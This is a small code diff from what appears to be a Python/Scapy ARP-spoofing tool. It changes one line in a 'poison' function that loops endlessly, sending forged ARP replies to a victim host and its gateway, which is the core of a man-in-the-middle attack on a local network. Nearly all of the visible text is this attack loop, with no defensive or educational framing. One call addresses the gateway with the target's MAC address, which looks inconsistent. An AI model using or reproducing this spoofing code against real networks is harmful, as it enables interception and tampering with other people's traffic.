@@ -15,7 +15,7 @@ def poison(gateway_ip, gateway_mac, target_ip, target_mac, delay=5):
     while True:
         send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac))
         send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=target_mac))
-        time.sleep(delay)
+        time.sleep(float(delay))
 
 # get the mac addr of an ip
 def get_mac(ip_address):
